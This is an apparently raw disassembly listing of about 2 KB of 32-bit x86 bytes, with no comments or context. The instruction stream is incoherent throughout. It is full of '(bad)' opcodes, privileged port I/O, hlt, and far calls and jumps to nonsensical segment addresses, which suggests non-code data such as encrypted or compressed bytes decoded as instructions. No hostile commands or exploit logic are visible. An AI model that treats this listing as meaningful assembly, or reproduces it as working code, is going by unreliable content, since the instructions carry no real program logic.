  426dd8:	sbb    DWORD PTR [ebp+0x132e8df0],ebx
  426dde:	(bad)  
  426ddf:	jo     0x426e13
  426de1:	ja     0x426e42
  426de3:	pavgb  mm0,QWORD PTR [eax+edx*8-0x65124baa]
  426deb:	adc    ah,ah
  426ded:	adc    dl,ch
  426def:	push   ecx
  426df0:	(bad)  
  426df1:	dec    edi
  426df2:	ret    0x72ed
  426df5:	jns    0x426dbe
  426df7:	add    BYTE PTR [edx+0x38],bh
  426dfa:	jns    0x426e21
  426dfc:	mov    ebx,0x2ff9ed9e
  426e01:	scas   eax,DWORD PTR es:[edi]
  426e02:	push   ebx
  426e03:	xchg   DWORD PTR [esi-0x41414fd9],eax
  426e09:	fdiv   DWORD PTR [esi-0x6a]
  426e0c:	dec    esi
  426e0d:	cmp    bl,BYTE PTR [edi]
  426e0f:	sbb    eax,edx
  426e11:	mov    esp,0x8bc7e78b
  426e16:	xchg   edi,eax
  426e17:	imul   edx,DWORD PTR [ebx-0x33],0xffffffcd
  426e1b:	add    al,0x86
  426e1d:	popaw  
  426e1f:	fdiv   QWORD PTR [ebp+0x1a]
  426e22:	push   eax
  426e23:	daa    
  426e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e25:	pop    esi
  426e26:	cmp    eax,0x1f4bc009
  426e2b:	dec    ecx
  426e2c:	pop    esp
  426e2d:	add    eax,0xc08914ba
  426e32:	push   ebx
  426e33:	jp     0x426e26
  426e35:	call   0x74a5bc4d
  426e3a:	std    
  426e3b:	push   esi
  426e3c:	xchg   ch,dl
  426e3e:	test   eax,0x655d152c
  426e43:	sbb    esi,0x5a
  426e46:	cmp    eax,0xe14afe40
  426e4b:	clc    
  426e4c:	xchg   ecx,eax
  426e4d:	shl    bh,cl
  426e4f:	fild   QWORD PTR [edi-0x46e27ad1]
  426e55:	dec    edx
  426e56:	sahf   
  426e57:	jns    0x426e7a
  426e59:	loope  0x426e91
  426e5b:	push   ebp
  426e5c:	fcom   st(6)
  426e5e:	jno    0x426e60
  426e60:	scas   eax,DWORD PTR es:[edi]
  426e61:	hlt    
  426e62:	inc    ebp
  426e63:	mov    ah,0xe1
  426e65:	test   al,0x74
  426e68:	push   0xffffffbb
  426e6a:	ss add cl,ch
  426e6d:	mov    ch,0xd8
  426e6f:	stos   DWORD PTR es:[edi],eax
  426e70:	pop    edx
  426e71:	sbb    al,0xa6
  426e73:	lahf   
  426e74:	xor    BYTE PTR [edx+0x42],cl
  426e77:	imul   DWORD PTR [ebp+ecx*4-0x4dc1299f]
  426e7e:	ja     0x426ec9
  426e80:	add    DWORD PTR [ecx],0xffffffbe
  426e83:	jns    0x426edf
  426e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e86:	(bad)  
  426e87:	addr16 sub dh,dl
  426e8a:	and    DWORD PTR [eax-0x7],edx
  426e8d:	ficom  WORD PTR [eax-0x7d]
  426e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e91:	and    cl,ch
  426e93:	cwde   
  426e94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e95:	adc    esi,edx
  426e97:	adc    DWORD PTR [eax+0x76],ebp
  426e9a:	repz jo 0x426edb
  426e9d:	adc    BYTE PTR [ecx+0x66],ch
  426ea0:	js     0x426ec5
  426ea2:	test   eax,0xa26884f7
  426ea7:	js     0x426e33
  426ea9:	xor    BYTE PTR [edi],bl
  426eab:	xchg   DWORD PTR fs:[ebx],edi
  426eae:	hlt    
  426eaf:	addr16 jmp 0x183ab54c
  426eb5:	loope  0x426e92
  426eb7:	and    BYTE PTR [edx+0x1e036d0c],al
  426ebd:	sbb    ebx,ebp
  426ebf:	out    dx,eax
  426ec0:	jmp    0x426f21
  426ec2:	stc    
  426ec3:	(bad)  
  426ec4:	ror    BYTE PTR [ebx-0x3620af55],0x97
  426ecb:	data16 in al,dx
  426ecd:	dec    edx
  426ece:	jae    0x426f16
  426ed0:	xchg   edx,eax
  426ed1:	dec    edi
  426ed2:	pop    esi
  426ed3:	inc    esp
  426ed4:	jmp    0x9fd3:0xca0a5846
  426edb:	jno    0x426f1e
  426edd:	addr16 out 0x8f,al
  426ee0:	jb     0x426e63
  426ee2:	pop    es
  426ee3:	mov    al,0xbb
  426ee5:	enter  0x3913,0x8c
  426ee9:	js     0x426ebc
  426eeb:	inc    esi
  426eec:	in     eax,dx
  426eed:	fwait
  426eee:	xchg   ebx,eax
  426eef:	lds    esp,FWORD PTR [esi-0x4184426d]
  426ef5:	xor    DWORD PTR [ebp-0x28dd1831],ebx
  426efb:	add    al,0xe5
  426efd:	cld    
  426efe:	outs   dx,BYTE PTR cs:[esi]
  426f00:	jne    0x426f53
  426f02:	xchg   edx,eax
  426f03:	push   ebp
  426f04:	xchg   DWORD PTR [edi+0x346c0ca3],ecx
  426f0a:	sbb    eax,0x2e258200
  426f0f:	cli    
  426f10:	xor    bh,BYTE PTR [ebp-0x43]
  426f13:	aaa    
  426f14:	out    dx,eax
  426f15:	cdq    
  426f16:	jmp    ecx
  426f18:	mov    esp,0xe14c950d
  426f1d:	aam    0xd0
  426f1f:	std    
  426f20:	addr16 xchg ecx,eax
  426f22:	mov    edi,0x40d88726
  426f27:	xor    al,cl
  426f29:	out    0x24,eax
  426f2b:	outs   dx,BYTE PTR ds:[esi]
  426f2c:	pop    esi
  426f2d:	loopne 0x426f08
  426f2f:	xor    dl,0xc2
  426f32:	pop    ebp
  426f33:	lods   al,BYTE PTR ds:[esi]
  426f34:	pop    eax
  426f35:	push   ds
  426f36:	sub    al,0x90
  426f38:	jle    0x426efa
  426f3a:	mov    dh,0x42
  426f3c:	mov    bh,0x2b
  426f3e:	inc    esi
  426f3f:	add    DWORD PTR [edx-0x5d],ebx
  426f42:	fldlg2 
  426f44:	sub    eax,0xccc6356f
  426f49:	jle    0x426f8d
  426f4b:	or     ah,BYTE PTR [ecx+0x78]
  426f4e:	test   ebp,eax
  426f50:	adc    ebx,DWORD PTR [ebp-0x706deaa3]
  426f56:	(bad)  
  426f57:	cmp    al,0xff
  426f59:	jne    0x426f19
  426f5b:	mov    ds:0xead58379,al
  426f60:	ds or  eax,0xca087327
  426f66:	cmp    DWORD PTR [esi-0x7c],ebx
  426f69:	push   edi
  426f6a:	cmp    al,0x45
  426f6c:	lods   eax,DWORD PTR ds:[esi]
  426f6d:	mov    esi,0xb5a6d3d2
  426f72:	inc    esp
  426f73:	or     ebx,0xd776c970
  426f79:	cmp    DWORD PTR [ebx-0x1b],0x34
  426f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f7e:	sub    ecx,DWORD PTR [ebx+0x4a8cd421]
  426f84:	rcl    DWORD PTR [ebp+0x53],0xaf
  426f88:	sahf   
  426f89:	mov    ebp,0x21577cdf
  426f8e:	call   0x50c7:0xe2e7417e
  426f95:	retf   
  426f96:	sub    eax,0xe70e9d9e
  426f9b:	xchg   BYTE PTR [edi-0x79b99714],dl
  426fa1:	xchg   ecx,eax
  426fa2:	rcr    BYTE PTR [esi+0x63],0x5
  426fa6:	adc    al,0x5d
  426fa8:	and    BYTE PTR ds:0x9ddc60c1,al
  426fae:	stos   BYTE PTR es:[edi],al
  426faf:	mov    al,ds:0xc6611cfe
  426fb4:	shl    BYTE PTR [edi-0x48d39090],1
  426fba:	lock call 0xc43a:0xc4fcd8ec
  426fc2:	into   
  426fc3:	clc    
  426fc4:	(bad)  
  426fc5:	lds    eax,FWORD PTR [ebp+esi*8-0x72]
  426fc9:	xor    DWORD PTR cs:[ebp-0x7b],eax
  426fcd:	jmp    0x5a2:0x81e1182d
  426fd4:	ror    BYTE PTR [esi-0x70ae5cc],1
  426fda:	adc    eax,0x3591dfed
  426fdf:	outs   dx,DWORD PTR ds:[esi]
  426fe0:	inc    ecx
  426fe1:	sub    esp,esp
  426fe3:	sub    dl,0x15
  426fe6:	and    ebp,DWORD PTR [esi]
  426fe8:	pop    esi
  426fe9:	loopne 0x42703b
  426feb:	lock outs dx,DWORD PTR ds:[esi]
  426fed:	out    0x7e,al
  426fef:	cmp    eax,ecx
  426ff1:	adc    edx,DWORD PTR [ecx-0x76]
  426ff4:	mov    ds:0xbc885646,al
  426ff9:	inc    edx
  426ffa:	jmp    0x18771c45
  426fff:	mov    edx,0x8b374df4
  427004:	ins    DWORD PTR es:[edi],dx
  427005:	fwait
  427006:	ins    BYTE PTR es:[edi],dx
  427007:	outs   dx,BYTE PTR ds:[esi]
  427008:	xchg   DWORD PTR [edx],edx
  42700a:	call   0xe4e2c20a
  42700f:	xor    BYTE PTR [ecx+0x19d8f4aa],0xf4
  427016:	leave  
  427017:	jp     0x426fdd
  427019:	mov    esp,0xd5777881
  42701e:	dec    ecx
  42701f:	data16 fld TBYTE PTR [ecx]
  427022:	xor    BYTE PTR [eax-0x4e],bl
  427025:	inc    ecx
  427026:	int    0x99
  427028:	ja     0x426ff3
  42702a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42702b:	inc    DWORD PTR [edx+esi*1+0x4526a522]
  427032:	daa    
  427033:	inc    edi
  427034:	inc    ecx
  427035:	call   0x866a9584
  42703a:	inc    ebx
  42703b:	cld    
  42703c:	add    al,0xe9
  42703e:	mov    ecx,0x2bc84f7d
  427043:	popa   
  427044:	pop    ss
  427045:	and    ch,BYTE PTR [ebp+0x1e306a03]
  42704b:	xor    ah,dl
  42704d:	jl     0x42703e
  42704f:	inc    ebp
  427050:	add    BYTE PTR [edx+0x4c35c06d],dh
  427056:	push   ss
  427057:	das    
  427058:	jbe    0x4270cd
  42705a:	fadd   QWORD PTR [eax]
  42705c:	mov    dh,0x42
  42705e:	ror    DWORD PTR [ecx],0x23
  427061:	leave  
  427062:	ins    DWORD PTR es:[edi],dx
  427063:	(bad)  
  427064:	fld    QWORD PTR [edx+0x42]
  427067:	out    0xa2,eax
  427069:	aad    0x52
  42706b:	(bad)  
  42706c:	inc    DWORD PTR [ecx-0x125ef776]
  427072:	test   BYTE PTR es:[edi],cl
  427075:	inc    esi
  427076:	int    0xf2
  427078:	mov    edi,0x2a20d14d
  42707d:	ds dec edx
  42707f:	(bad)
  427082:	sti    
  427083:	aad    0x90
  427085:	mov    DWORD PTR [eax],ebx
  427087:	retf   0xc2db
  42708a:	daa    
  42708b:	out    0xa3,eax
  42708d:	dec    eax
  42708e:	pop    ebx
  42708f:	scas   eax,DWORD PTR es:[edi]
  427090:	repz jns 0x42701c
  427093:	inc    eax
  427094:	inc    ebp
  427095:	js     0x427046
  427097:	cmp    ah,BYTE PTR [eax-0x6ee43c1e]
  42709d:	loopne 0x427085
  42709f:	jmp    0x427033
  4270a1:	mov    cl,0xc3
  4270a3:	pop    esi
  4270a4:	mov    ebp,0x403382d9
  4270a9:	xchg   edx,eax
  4270aa:	inc    ebp
  4270ab:	lahf   
  4270ac:	add    eax,0x6aff0081
  4270b1:	xor    eax,DWORD PTR [eax]
  4270b3:	inc    eax
  4270b4:	out    dx,al
  4270b5:	icebp  
  4270b6:	cld    
  4270b7:	retf   
  4270b8:	mov    edx,0x6c43ab91
  4270bd:	xor    ecx,edx
  4270bf:	xor    BYTE PTR [ecx],bh
  4270c1:	dec    esp
  4270c2:	test   al,0x70
  4270c4:	jmp    0x427086
  4270c6:	sub    ebx,DWORD PTR [eax-0x1ff005fa]
  4270cc:	jno    0x42709e
  4270ce:	push   ebp
  4270cf:	xchg   bx,ax
  4270d1:	mul    al
  4270d3:	shl    BYTE PTR [eax+0x2f589313],1
  4270d9:	dec    bh
  4270db:	mov    bl,ch
  4270dd:	dec    esp
  4270de:	mov    dh,0xbc
  4270e0:	fbld   TBYTE PTR [edx]
  4270e2:	pop    eax
  4270e3:	xchg   esp,eax
  4270e4:	mov    edi,0x7184e93
  4270e9:	cmp    ch,0x5a
  4270ec:	shl    eax,0x1a
  4270ef:	not    BYTE PTR [edi+0x5d]
  4270f2:	or     DWORD PTR ds:0x532e41d2,edx
  4270f8:	push   ss
  4270f9:	arpl   ax,ax
  4270fb:	sti    
  4270fc:	(bad)  
  4270fd:	jmp    0xf0de:0x27f34759
  427104:	pop    ebp
  427105:	mov    ds:0x1e237ce6,eax
  42710a:	in     eax,0x0
  42710c:	sbb    al,0x90
  42710e:	and    al,0x6e
  427110:	cmp    BYTE PTR [ecx],0xe6
  427113:	fdiv   QWORD PTR [ebx+ebp*1]
  427116:	sbb    esp,DWORD PTR [ebp+0x14499da0]
  42711c:	mov    edx,0xfb100f1f
  427121:	push   esi
  427122:	sar    BYTE PTR [esi+ecx*8],0x18
  427126:	adc    BYTE PTR [ebp+0x3e1622f8],0xc1
  42712d:	cmp    dh,BYTE PTR [eax-0x4802e486]
  427133:	cmp    DWORD PTR [ebx-0x80],0x72
  427137:	(bad)  
  427138:	xlat   BYTE PTR ds:[ebx]
  427139:	pop    esp
  42713a:	ja     0x4270e2
  42713c:	xchg   BYTE PTR [esi-0x3edb240],bh
  427142:	dec    edx
  427143:	(bad)  
  427144:	fdivr  QWORD PTR [ecx-0x72]
  427147:	xor    al,0xb2
  427149:	pop    ss
  42714a:	cld    
  42714b:	iret   
  42714c:	ja     0x427148
  42714e:	xor    esi,DWORD PTR [ebx-0x29]
  427151:	or     BYTE PTR [edx+0x72428931],bl
  427157:	xchg   ecx,eax
  427158:	inc    ecx
  427159:	pop    ss
  42715a:	pop    esp
  42715b:	out    0x38,eax
  42715d:	ret    
  42715e:	adc    BYTE PTR [eax-0x48],bh
  427161:	leave  
  427162:	jmp    0x297402a9
  427167:	cmp    DWORD PTR [ebp-0x47e40ff7],edi
  42716d:	push   esp
  42716e:	das    
  42716f:	retf   
  427170:	in     al,0x8a
  427172:	inc    esi
  427173:	shl    ebp,0x60
  427176:	retf   0x9cf4
  427179:	add    DWORD PTR [ecx],edx
  42717b:	stos   DWORD PTR es:[edi],eax
  42717c:	push   esp
  42717d:	inc    ecx
  42717e:	sub    eax,0x4ad50b07
  427183:	mov    ebx,0xeaaee254
  427188:	xlat   BYTE PTR ds:[ebx]
  427189:	sar    DWORD PTR [edi],1
  42718b:	inc    ecx
  42718c:	out    dx,al
  42718d:	inc    esi
  42718e:	adc    eax,0x11289282
  427193:	cmc    
  427194:	ins    DWORD PTR es:[edi],dx
  427195:	aad    0x78
  427197:	inc    DWORD PTR [esi]
  427199:	lods   eax,DWORD PTR ds:[esi]
  42719a:	shl    DWORD PTR [edi+0x72f0fc51],0x64
  4271a1:	aad    0x2d
  4271a3:	mov    ch,0x7f
  4271a5:	pusha  
  4271a6:	fs addr16 mov edi,0x308d13d4
  4271ad:	cmp    DWORD PTR [eax],eax
  4271af:	add    BYTE PTR [eax],al
  4271b1:	add    BYTE PTR [ebx],ch
  4271b3:	xchg   DWORD PTR [ebp-0x1f],esi
  4271b6:	std    
  4271b7:	repz mov edi,0x7da68ccf
  4271bd:	inc    ecx
  4271be:	fdivr  QWORD PTR fs:[ebx+0x20]
  4271c2:	fldl2t 
  4271c4:	add    DWORD PTR [eax],eax
  4271c6:	hlt    
  4271c7:	add    al,0x0
  4271c9:	add    BYTE PTR [ecx],bl
  4271cb:	lods   eax,DWORD PTR ds:[esi]
  4271cc:	stos   BYTE PTR es:[edi],al
  4271cd:	jb     0x4271a3
  4271cf:	hlt    
  4271d0:	dec    ebx
  4271d1:	pusha  
  4271d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271d3:	out    0x49,eax
  4271d5:	dec    esi
  4271d6:	shl    DWORD PTR [edi+ebx*8+0x20],cl
  4271da:	mov    ah,0x66
  4271dc:	test   eax,0x9dbaaab2
  4271e1:	or     al,0xca
  4271e3:	fistp  DWORD PTR fs:[esi+esi*1]
  4271e7:	sbb    BYTE PTR [eax+0x6],0xf4
  4271eb:	cmp    bh,ah
  4271ed:	mov    edx,0x4ca31c0d
  4271f2:	icebp  
  4271f3:	push   0x725d683f
  4271f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271f9:	fnstsw WORD PTR [ecx+0x70a9d982]
  4271ff:	in     al,dx
  427200:	rcl    DWORD PTR [ecx],cl
  427202:	sbb    BYTE PTR [ebp-0x63911e7c],dh
  427208:	test   al,0xb7
  42720a:	dec    edx
  42720b:	ret    0x5b6f
  42720e:	mov    ah,0x68
  427210:	push   0xffffffa4
  427212:	shr    BYTE PTR [eax],cl
  427214:	ss stos BYTE PTR es:[edi],al
  427216:	out    0x4f,eax
  427218:	aaa    
  427219:	jg     0x4271e1
  42721b:	adc    bl,BYTE PTR [ebx-0x2e88e1de]
  427221:	jbe    0x4271b4
  427223:	in     al,dx
  427224:	adc    al,al
  427226:	popf   
  427227:	cmp    ah,BYTE PTR [edi+ecx*2]
  42722a:	xlat   BYTE PTR ds:[ebx]
  42722b:	or     eax,DWORD PTR [ecx+0x7b]
  42722e:	enter  0x8629,0x5
  427232:	out    dx,al
  427233:	ret    
  427234:	jno    0x427243
  427236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427237:	out    0x55,al
  427239:	in     al,dx
  42723a:	and    al,0x28
  42723c:	hlt    
  42723d:	xchg   ecx,eax
  42723e:	jnp    0x42729f
  427240:	cli    
  427241:	pop    ss
  427242:	or     DWORD PTR [ebp+0x7d],0xf6898a5d
  427249:	test   al,0x94
  42724b:	ins    BYTE PTR es:[edi],dx
  42724c:	(bad)  
  42724d:	sbb    edx,ecx
  42724f:	es out dx,eax
  427251:	out    dx,eax
  427252:	popa   
  427253:	mov    ah,0xe2
  427255:	test   DWORD PTR [ecx+esi*8-0x5c],eax
  427259:	rcl    BYTE PTR [eax-0x35ebf656],0xb9
  427260:	mov    esp,cr2
  427263:	inc    eax
  427264:	push   ebp
  427265:	or     eax,0xd91b8615
  42726a:	sub    ecx,esi
  42726c:	xor    ch,al
  42726e:	test   eax,0xb7555906
  427273:	out    dx,eax
  427274:	clc    
  427275:	ins    BYTE PTR es:[edi],dx
  427276:	sbb    al,0xb0
  427278:	inc    edi
  427279:	cmp    DWORD PTR [ebp+0x1],ecx
  42727c:	mov    dl,0x95
  42727e:	shr    ch,cl
  427280:	out    0xe0,al
  427282:	push   eax
  427283:	iret   
  427284:	push   ecx
  427285:	push   eax
  427286:	(bad)  
  427287:	fadd   st(0),st
  427289:	shl    ebp,1
  42728b:	cdq    
  42728c:	hlt    
  42728d:	jbe    0x427275
  42728f:	add    eax,0x994efc48
  427294:	adc    ebx,DWORD PTR [edi+0x700f472b]
  42729a:	add    esi,ecx
  42729c:	pop    ecx
  42729d:	aad    0xba
  42729f:	test   DWORD PTR [eax+0xc],ecx
  4272a2:	or     DWORD PTR [ebp+0x710f509c],edx
  4272a8:	sub    al,0x9d
  4272aa:	std    
  4272ab:	aam    0xee
  4272ad:	in     eax,0xb6
  4272af:	adc    BYTE PTR [eax+0x17dce5a5],bl
  4272b5:	add    bl,0xe9
  4272b8:	mov    ah,0xbf
  4272ba:	test   BYTE PTR [esi-0x76],dl
  4272bd:	jg     0x427289
  4272bf:	xor    eax,0x1c5d84b3
  4272c4:	ss push 0x74fda048
  4272ca:	jb     0x4272a1
  4272cc:	pop    esi
  4272cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272ce:	outs   dx,DWORD PTR ds:[esi]
  4272cf:	fimul  WORD PTR [eax+eiz*8+0x42eaeab7]
  4272d6:	fist   DWORD PTR [edi+0x74e5db20]
  4272dc:	test   bh,al
  4272de:	or     BYTE PTR [ebp+0x6aed7123],cl
  4272e4:	push   esi
  4272e5:	xor    DWORD PTR [esi-0x2d862574],0x4ec0d073
  4272ef:	lea    esp,[esi+edi*1-0x47baec4b]
  4272f6:	xchg   edx,eax
  4272f7:	dec    edi
  4272f8:	push   ss
  4272f9:	push   ds
  4272fa:	sbb    al,0xf1
  4272fc:	dec    ebp
  4272fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272fe:	call   0xaf01:0xbfebc90f
  427305:	clc    
  427306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427307:	hlt    
  427308:	in     al,dx
  427309:	in     al,dx
  42730a:	ret    
  42730b:	hlt    
  42730c:	test   DWORD PTR [ecx+eiz*2-0x60],esp
  427310:	mov    al,ds:0xdbd0dda4
  427315:	ret    
  427316:	mov    esi,0x7b333d43
  42731b:	lahf   
  42731c:	iret   
  42731d:	daa    
  42731e:	add    ecx,DWORD PTR [edx]
  427320:	or     al,0xb1
  427322:	test   al,0xf0
  427324:	xchg   esp,eax
  427325:	sbb    DWORD PTR [edx],ebx
  427327:	test   eax,0xdd83d9f
  42732c:	mov    ebx,0x7532f617
  427331:	lahf   
  427332:	enter  0xa65c,0xd2
  427336:	fsubr  QWORD PTR [edx]
  427338:	gs jle 0x42731c
  42733b:	loopne 0x427350
  42733d:	in     al,dx
  42733e:	and    eax,0x83a096ba
  427343:	add    edi,edx
  427345:	retf   
  427346:	je     0x42738f
  427348:	mov    eax,0x14c401ca
  42734d:	mov    WORD PTR [edi+0x38d55234],gs
  427353:	sbb    eax,0x986ba67
  427358:	jmp    0x42733f
  42735a:	sahf   
  42735b:	call   0xf4ba:0x98248959
  427362:	mov    edi,DWORD PTR [esi]
  427364:	test   edi,0x7fbbdc2d
  42736a:	enter  0x41ad,0xeb
  42736e:	jne    0x427369
  427370:	xchg   ebx,eax
  427371:	adc    al,ah
  427373:	mov    esi,0xe2975d61
  427378:	mov    esi,esi
  42737a:	dec    ecx
  42737b:	or     ch,cl
  42737d:	mov    esi,0x63c5b4d6
  427382:	dec    ebx
  427383:	push   0x6036ef09
  427388:	and    BYTE PTR [esi],dh
  42738a:	mov    ebx,0xead09fed
  42738f:	jle    0x427326
  427391:	sti    
  427392:	stos   BYTE PTR es:[edi],al
  427393:	das    
  427394:	add    esp,esp
  427396:	push   es
  427397:	loop   0x4273cd
  427399:	ret    0x7b8f
  42739c:	push   ds
  42739d:	les    esi,FWORD PTR [ebx-0x7c]
  4273a0:	pushf  
  4273a1:	mov    eax,ds:0x824a99ed
  4273a6:	add    dl,BYTE PTR [eax]
  4273a8:	jo     0x4273d4
  4273aa:	cmp    BYTE PTR [esi+0x57],dh
  4273ad:	xchg   esp,eax
  4273ae:	lahf   
  4273af:	aad    0x11
  4273b1:	cmp    al,0x64
  4273b3:	ret    
  4273b4:	cmp    eax,0x457c380f
  4273b9:	hlt    
  4273ba:	cmp    ah,dh
  4273bc:	mov    edi,0x14b3face
  4273c1:	mov    dl,0x90
  4273c3:	outs   dx,DWORD PTR ds:[esi]
  4273c4:	mov    cl,0xe7
  4273c6:	out    0x3a,eax
  4273c8:	sub    eax,0xa2fd97da
  4273cd:	mov    cl,0x27
  4273cf:	mov    bl,0xf1
  4273d1:	into   
  4273d2:	gs pop ds
  4273d4:	jle    0x4273d8
  4273d6:	xchg   DWORD PTR [ebp-0x65a207b1],edi
  4273dc:	jmp    0x427459
  4273de:	lds    esp,FWORD PTR [edi+0x6a8e70db]
  4273e4:	cmc    
  4273e5:	push   es
  4273e6:	enter  0x7278,0x4f
  4273ea:	sar    ebx,cl
  4273ec:	je     0x427469
  4273ee:	adc    al,BYTE PTR [eax]
  4273f0:	out    dx,al
  4273f1:	adc    esi,DWORD PTR [edx]
  4273f3:	ins    BYTE PTR es:[edi],dx
  4273f4:	inc    DWORD PTR [eax+0x58cce992]
  4273fa:	or     cl,BYTE PTR [esi-0x69ba7df7]
  427400:	mov    DWORD PTR [ebx],0xcf0aa5a2
  427406:	lock sbb eax,ebx
  427409:	mov    WORD PTR [eax+0x4c],?
  42740c:	jl     0x427463
  42740e:	es retf 
  427410:	inc    eax
  427411:	and    dh,0x2a
  427414:	jne    0x427423
  427416:	popf   
  427417:	inc    edi
  427418:	push   esp
  427419:	xchg   DWORD PTR [ebx],ecx
  42741b:	mov    edx,0x47f9413
  427420:	sbb    al,0x90
  427422:	mov    dh,0xac
  427424:	sbb    DWORD PTR [eax-0x989ac1d],ebx
  42742a:	shr    DWORD PTR [ebx+0x4f],cl
  42742d:	jl     0x4273d1
  42742f:	or     BYTE PTR [edx-0x69],al
  427432:	sbb    al,0xce
  427434:	mov    edi,0xca3a86c
  427439:	stos   BYTE PTR es:[edi],al
  42743a:	sbb    eax,0x4d906a38
  42743f:	xchg   ecx,eax
  427440:	es stc 
  427442:	mov    al,0x9b
  427444:	mov    ah,0xab
  427446:	out    dx,eax
  427447:	adc    al,0x20
  427449:	(bad)  
  42744b:	mov    dl,0x94
  42744d:	dec    esi
  42744e:	ins    DWORD PTR es:[edi],dx
  42744f:	sub    bl,BYTE PTR [esi]
  427451:	dec    esp
  427452:	add    ebx,DWORD PTR [eax+0x437d9878]
  427458:	pushf  
  427459:	hlt    
  42745a:	(bad)  
  42745b:	mov    eax,ds:0xc7e9c3dc
  427460:	and    BYTE PTR [ebp+0x6b],cl
  427463:	jl     0x427401
  427465:	loopne 0x427410
  427467:	es das 
  427469:	clc    
  42746a:	dec    eax
  42746b:	(bad)  
  42746c:	icebp  
  42746d:	mov    al,0x6
  42746f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427470:	jle    0x42745d
  427472:	push   es
  427473:	stos   DWORD PTR es:[edi],eax
  427474:	inc    bp
  427476:	mov    al,0x22
  427478:	mov    edx,ecx
  42747a:	xor    al,0xbe
  42747c:	or     cl,dl
  42747e:	mov    edx,0x3926e3e3
  427483:	rcr    bl,cl
  427485:	push   0xb018457a
  42748a:	inc    eax
  42748b:	pop    esp
  42748c:	out    dx,al
  42748d:	xlat   BYTE PTR ds:[ebx]
  42748e:	sbb    bl,dh
  427490:	pushf  
  427491:	or     ah,0xba
  427494:	sbb    eax,0x96990b37
  427499:	and    DWORD PTR [ebx-0x23],esi
  42749c:	cmp    DWORD PTR [eax+0x45],edx
  42749f:	lds    ecx,FWORD PTR [edx-0x43]
  4274a2:	enter  0x126f,0x78
  4274a6:	or     al,BYTE PTR [edi+0x27]
  4274a9:	mov    esi,DWORD PTR [edi]
  4274ab:	mov    WORD PTR [edi+esi*4+0x1359cf7a],?
  4274b2:	xchg   BYTE PTR [edx],bl
  4274b4:	inc    ebp
  4274b5:	int    0x5
  4274b7:	imul   esp,DWORD PTR [edi-0x73],0x709a7774
  4274be:	mov    edx,0x8f6702ba
  4274c3:	adc    ah,BYTE PTR [ebx-0x18]
  4274c6:	sbb    DWORD PTR [ebp-0x4fb97ecf],0xffffffcf
  4274cd:	(bad)  
  4274ce:	mov    esi,0x79fe3e73
  4274d3:	push   DWORD PTR [esi-0x3f]
  4274d6:	xor    DWORD PTR [edx],esi
  4274d8:	xor    al,0xa6
  4274da:	loop   0x4274bf
  4274dc:	fdivr  st,st(0)
  4274de:	jp     0x4274a4
  4274e0:	retf   0x240c
  4274e3:	aaa    
  4274e4:	jne    0x427543
  4274e6:	addr16 mov eax,ecx
  4274e9:	sbb    eax,0x3a36233f
  4274ee:	mov    ds:0xc5ab0d17,eax
  4274f3:	xchg   DWORD PTR fs:[ecx-0x78],edx
  4274f7:	push   ebp
  4274f8:	pop    edx
  4274f9:	lahf   
  4274fa:	int3   
  4274fb:	pusha  
  4274fc:	shl    DWORD PTR [edx+0x531b4e0a],cl
  427502:	in     eax,0x7d
  427504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427505:	femms  
  427507:	fisubr WORD PTR [edx]
  427509:	jp     0x4274b2
  42750b:	xor    ah,BYTE PTR [esi-0x52]
  42750e:	sahf   
  42750f:	jns    0x427527
  427511:	iret   
  427512:	pop    ebx
  427513:	xchg   esp,eax
  427514:	sar    BYTE PTR [edi],0xa8
  427517:	out    dx,al
  427518:	dec    esi
  427519:	test   eax,0x2592c147
  42751e:	and    al,0x4a
  427520:	call   0xab97:0x64ed250
  427527:	push   ebp
  427528:	les    edx,FWORD PTR [eax+0x2]
  42752b:	loop   0x42750d
  42752d:	inc    ebx
  42752e:	and    cl,ah
  427530:	fnsave [edi]
  427532:	sbb    DWORD PTR [edx-0x56926873],ebp
  427538:	aaa    
  427539:	cdq    
  42753a:	outs   dx,BYTE PTR ds:[esi]
  42753b:	cmp    edx,edi
  42753d:	fiadd  DWORD PTR [edx+0x3b643994]
  427543:	sub    esp,ebx
  427545:	pop    edx
  427546:	or     bh,BYTE PTR [ecx+0x3ce05973]
  42754c:	xchg   esp,eax
  42754d:	icebp  
  42754e:	mov    eax,0x18573d04
  427553:	loopne 0x4275c1
  427555:	je     0x4275d4
  427557:	add    dl,bh
  427559:	ds mov edi,0xafe6cce0
  42755f:	push   esp
  427560:	jo     0x4275a8
  427562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427563:	lods   al,BYTE PTR ds:[esi]
  427564:	adc    eax,0x2d20f108
  427569:	mov    dl,bl
  42756b:	jae    0x427522
  42756d:	shr    BYTE PTR [edi-0x74],0x76
  427571:	(bad)  
  427574:	sub    ecx,DWORD PTR [esi-0x3e89d115]
  42757a:	xchg   BYTE PTR [ecx],ah
  42757c:	fist   WORD PTR [ecx-0x19]
  42757f:	mov    bl,0x69
  427581:	in     al,dx
  427582:	std    
  427583:	sub    eax,0x64eebfa2
  427588:	jmp    0x9373:0xf6b721e9
  42758f:	leave  
  427590:	sub    eax,0xb9f9d49d
  427595:	xchg   ecx,eax
  427596:	test   DWORD PTR [eax],0xa211422b
  42759c:	jp     0x427611
  42759e:	(bad)  
  42759f:	ficom  DWORD PTR [eax+0x3b]
  4275a2:	xor    eax,0x821ca3d8
  4275a7:	cmp    eax,0xdc85e368
  4275ac:	ja     0x427540
  4275ae:	push   edi
  4275af:	cld    
  4275b0:	pop    esp
  4275b1:	jnp    0x427549
  4275b3:	adc    BYTE PTR [edi+ebp*2+0xa],0x27
  4275b8:	out    dx,al
  4275b9:	pop    esi
  4275ba:	jno    0x4275a6
